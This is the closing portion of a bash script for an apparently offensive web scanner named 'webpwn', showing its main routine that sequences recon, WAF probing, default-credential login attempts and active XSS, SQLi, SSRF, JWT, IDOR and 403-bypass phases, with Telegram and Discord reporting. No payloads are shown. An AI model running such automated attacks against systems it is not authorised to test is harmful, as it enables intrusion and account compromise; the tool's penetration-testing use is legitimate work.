                "bash $(realpath "$0") ${relaunch_args[*]}; echo 'Scan complete. Press Enter to exit.'; read"
            log_ok "Background tmux session: tmux attach -t ${session_name}"
        fi
        exit 0
    fi

    check_mandatory_tools   # exits if wafw00f / httpx / nuclei are missing

    # Bot-listen mode: daemon that accepts Telegram scan commands
    if $TG_BOT_MODE; then
        tg_bot_listen
        exit 0
    fi

    setup_dirs
    _early_waf_probe       # WAF fingerprint BEFORE auth so login is WAF-aware
    setup_auth             # primary user â€” populates AUTH_CURL_OPTS etc.
    setup_auth_secondary   # secondary (low-priv) user â€” populates AUTH2_CURL_OPTS etc.

    # â”€â”€ JWT refresh daemon â€” keeps token fresh for long-running scans â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if [[ "$AUTH_MODE" == "jwt" || "$AUTH_MODE" == "form" ]]; then
        if [[ -n "$JWT_REFRESH_TOKEN" && -n "$JWT_REFRESH_URL" ]]; then
            _start_jwt_refresh_daemon
        elif [[ -n "$AUTH_USER" && -n "$AUTH_PASS" && -n "$AUTH_LOGIN_URL" && "$JWT_EXPIRY" -gt 0 ]]; then
            _start_jwt_refresh_daemon
        fi
    fi

    # Continuous Telegram command poller â€” runs every 10s for the entire scan
    # so /status /findings /stop /clear always work, even mid-phase
    if [[ -n "$TELEGRAM_BOT_TOKEN" && -n "$TELEGRAM_CHAT_ID" ]]; then
        (
            while kill -0 $$ 2>/dev/null; do
                tg_poll_commands 2>/dev/null || true
                sleep 10
            done
        ) &
        TG_POLL_PID=$!
        # Ensure poller is killed when the main scan exits
        trap 'kill "$TG_POLL_PID" 2>/dev/null || true' EXIT INT TERM
    fi

    # Write shared state file so bot listener can track this scan regardless of how it was started
    mkdir -p "$(dirname "$STATE_FILE")"
    printf 'PID=%s\nTARGET=%s\nOUTDIR=%s\nPHASE=init\nSTART=%s\nAUTH1=%s\nAUTH2=%s\nWAF=%s\n' \
        "$$" "$TARGET" "$OUTDIR" "$(date +%s)" "$AUTH_MODE" "$AUTH2_MODE" "$WAF_NAME" > "$STATE_FILE"
    trap 'rm -f "$STATE_FILE"' EXIT

    log_info "Target: ${BOLD}$TARGET${RESET}"
    [[ -n "$URL_LIST" ]] && log_info "URL-list: ${BOLD}$URL_LIST${RESET} ($(wc -l < "$LIVE_HOSTS" 2>/dev/null || echo 0) URLs)"
    $API_MODE && log_info "Mode: ${BOLD}API${RESET} (port scan / subdomain recon / screenshots skipped)"
    log_info "Output: ${BOLD}$OUTDIR${RESET}"
    log_dim "Threads: $THREADS | Rate: ${RATE_LIMIT} req/s | Crawl depth: ${DEPTH}"
    log_dim "Default creds: ${TRY_DEFAULT_CREDS} | Notify: tg=$([ -n "$TELEGRAM_BOT_TOKEN" ] && echo on || echo off) discord=$([ -n "$DISCORD_WEBHOOK_URL" ] && echo on || echo off) email=$([ -n "$NOTIFY_EMAIL_TO" ] && echo on || echo off)"
    [[ ${#CUSTOM_HEADERS_ARGS[@]} -gt 0 ]] && log_dim "Custom headers: ${CUSTOM_HEADERS_ARGS[*]}"
    [[ "$AUTH_MODE" != "none" ]] && log_ok "Auth mode: ${BOLD}${AUTH_MODE}${RESET} (all tools will send credentials)"
    $JWT_COOKIE_MODE && log_ok "JWT transport: cookie '${JWT_COOKIE_NAME}'"
    [[ -n "$JWT_REFRESH_TOKEN" ]] && log_ok "JWT refresh: enabled (refresh token provided)"
    echo

    # Send scan-start notification
    notify_all "ðŸš€ *webpwn scan started*
Target: \`${TARGET}\`
Mode: $([ -n "$URL_LIST" ] && echo 'URL-list' || ([ -n "$BASE_URL" ] && echo 'base-URL' || ($API_MODE && echo 'API' || echo 'domain')))
Auth: \`${AUTH_MODE}\` | JWT-cookie: ${JWT_COOKIE_MODE}
Output: \`${OUTDIR}\`
Time: $(date '+%Y-%m-%d %H:%M:%S')
Send /help to see bot commands."

    # Run all phases or a specific one
    if [[ -n "$SINGLE_PHASE" ]]; then
        CURRENT_PHASE="$SINGLE_PHASE"
        # For any active scanning phase: run WAF detection first so the rate-limit /
        # bypass profile is applied before payloads go out.  Pre-scan/info phases
        # (recon, dns, ports, http, waf, infra, screenshots, report) don't need this.
        case "$SINGLE_PHASE" in
            recon|dns|ports|http|waf|infra|screenshots|report) : ;;
            *)
                log_info "Single-phase mode: running WAF detection first (required before active scanning)"
                run_phase "waf" phase_waf
                ;;
        esac
        case "$SINGLE_PHASE" in
            recon)        run_phase "recon" phase_recon ;;
            dns)          run_phase "dns" phase_dns ;;
            ports)        run_phase "ports" phase_ports ;;
            http)         run_phase "http" phase_http ;;
            infra)        run_phase "infra" phase_infra ;;
            waf)          run_phase "waf" phase_waf ;;
            crawl|urls)   run_phase "crawl" phase_crawl ;;
            jsanalysis)   run_phase "jsanalysis" phase_js_analysis ;;
            content)      run_phase "content" phase_content ;;
            vulns)        run_phase "vulns" phase_vulns ;;
            xss)          run_phase "xss" phase_xss ;;
            sqli)         run_phase "sqli" phase_sqli ;;
            ssrf)         run_phase "ssrf" phase_ssrf_redirect ;;
            ssti)         run_phase "ssti" phase_ssti ;;
            xxe)          run_phase "xxe" phase_xxe ;;
            jwt)          run_phase "jwt" phase_jwt_attacks ;;
            graphql)      run_phase "graphql" phase_graphql ;;
            oauth)        run_phase "oauth" phase_oauth ;;
            secrets)      run_phase "secrets" phase_secrets ;;
            takeover)     run_phase "takeover" phase_takeover ;;
            cors)         run_phase "cors" phase_cors ;;
            403)          run_phase "403bypass" phase_403_bypass ;;
            idor)         run_phase "idor" phase_idor ;;
            bac)          run_phase "bac" phase_bac ;;
            screenshots)  run_phase "screenshots" phase_screenshots ;;
            report)       run_phase "report" phase_report ;;
            *) log_error "Unknown phase: $SINGLE_PHASE"; exit 1 ;;
        esac
    else
        # â”€â”€ Phase skip logic: URL-list / base-URL / API mode bypass recon â”€â”€â”€â”€â”€â”€
        if [[ -n "$URL_LIST" || -n "$BASE_URL" ]] || $API_MODE; then
            log_info "URL-list/base-URL/API mode: skipping subdomain recon, DNS bruteforce, port scan"
            # URL-list and base-URL modes pre-seed LIVE_HOSTS â€” HTTP probe not needed
            if [[ -n "$URL_LIST" || -n "$BASE_URL" ]]; then
                log_info "LIVE_HOSTS pre-seeded â€” HTTP probe skipped"
            else
                run_phase "http"    phase_http  # API mode still probes the domain
            fi
        else
            run_phase "recon"   phase_recon
            run_phase "dns"     phase_dns
            run_phase "ports"   phase_ports
            run_phase "http"    phase_http
        fi
        run_phase "waf"         phase_waf         # WAF detection before any active scanning
        # After HTTP probing: try default creds (always on unless --no-default-creds)
        if $TRY_DEFAULT_CREDS && [[ -z "$URL_LIST" && -z "$BASE_URL" ]]; then
            CURRENT_PHASE="default-creds"
            state_set "PHASE" "default-creds"
            try_default_creds
            state_set "AUTH1" "$AUTH_MODE"
            state_set "AUTH2" "$AUTH2_MODE"
            state_set "WAF" "$WAF_NAME"
            [[ "$AUTH_MODE" != "none" ]] && \
                notify_tg "ðŸ”“ Authenticated as *${AUTH_MODE}* on \`${TARGET}\` â€” deeper scan enabled"
        fi
        run_phase "infra"       phase_infra
        run_phase "crawl"       phase_crawl
        run_phase "jsanalysis"  phase_js_analysis
        run_phase "content"     phase_content
        run_phase "vulns"       phase_vulns
        run_phase "xss"         phase_xss
        run_phase "sqli"        phase_sqli
        run_phase "ssrf"        phase_ssrf_redirect
        run_phase "ssti"        phase_ssti
        run_phase "xxe"         phase_xxe
        run_phase "jwt"         phase_jwt_attacks
        run_phase "graphql"     phase_graphql
        run_phase "oauth"       phase_oauth
        run_phase "secrets"     phase_secrets
        run_phase "takeover"    phase_takeover
        run_phase "cors"        phase_cors
        run_phase "403bypass"   phase_403_bypass
        run_phase "idor"        phase_idor
        run_phase "bac"         phase_bac
        [[ -z "$URL_LIST" && -z "$BASE_URL" ]] && run_phase "screenshots" phase_screenshots
        run_phase "report"      phase_report
    fi

    # Final notification with summary
    local n_total; n_total=$(wc -l < "$VULN_DIR/nuclei/all_findings.jsonl" 2>/dev/null || echo 0)
    local n_crit; n_crit=$(wc -l < "$VULN_DIR/nuclei/critical_high.jsonl" 2>/dev/null || echo 0)
    local end_time; end_time=$(date +%s)
    local dur=$(( end_time - START_TIME ))
    local dur_fmt; dur_fmt=$(printf "%dh %dm %ds" $((dur/3600)) $((dur%3600/60)) $((dur%60)))

    notify_all "âœ… *Scan complete*
Target: \`${TARGET}\`
Duration: ${dur_fmt}
Auth: ${AUTH_ROLE1}=${AUTH_MODE} | ${AUTH_ROLE2}=${AUTH2_MODE} | WAF: ${WAF_NAME}
Nuclei: ${n_total} (crit/high: ${n_crit})
XSS confirmed: $(grep -c CONFIRMED "$VULN_DIR/xss/reflected.txt" 2>/dev/null || echo 0) | Dalfox: $(wc -l < "$VULN_DIR/xss/dalfox_findings.txt" 2>/dev/null || echo 0)
SQLi confirmed: $(wc -l < "$VULN_DIR/sqli/error_based_confirmed.txt" 2>/dev/null || echo 0) | Time-based: $(wc -l < "$VULN_DIR/sqli/timebased_confirmed.txt" 2>/dev/null || echo 0)
IDOR: $(wc -l < "$VULN_DIR/idor/findings.txt" 2>/dev/null || echo 0)
BAC: $(wc -l < "$VULN_DIR/bac/findings.txt" 2>/dev/null || echo 0)
SSTI: $(wc -l < "$VULN_DIR/ssti/findings.txt" 2>/dev/null || echo 0) | XXE: $(wc -l < "$VULN_DIR/xxe/findings.txt" 2>/dev/null || echo 0)
JWT vulns: $(wc -l < "$VULN_DIR/jwt/findings.txt" 2>/dev/null || echo 0) | GraphQL: $(wc -l < "$VULN_DIR/graphql/findings.txt" 2>/dev/null || echo 0) | OAuth: $(wc -l < "$VULN_DIR/oauth/findings.txt" 2>/dev/null || echo 0)
CORS exploitable: $(grep -c EXPLOITABLE "$VULN_DIR/cors/cors_findings.txt" 2>/dev/null || echo 0)
Secrets in JS: $(wc -l < "$VULN_DIR/secrets/js_secrets.txt" 2>/dev/null || echo 0)
403 bypassed: $(grep -cE "BYPASS|NOMORE" "$VULN_DIR/403bypass/bypassed.txt" 2>/dev/null || echo 0)
Report: \`${OUTDIR}/reports/summary.md\`"
}

main "$@"
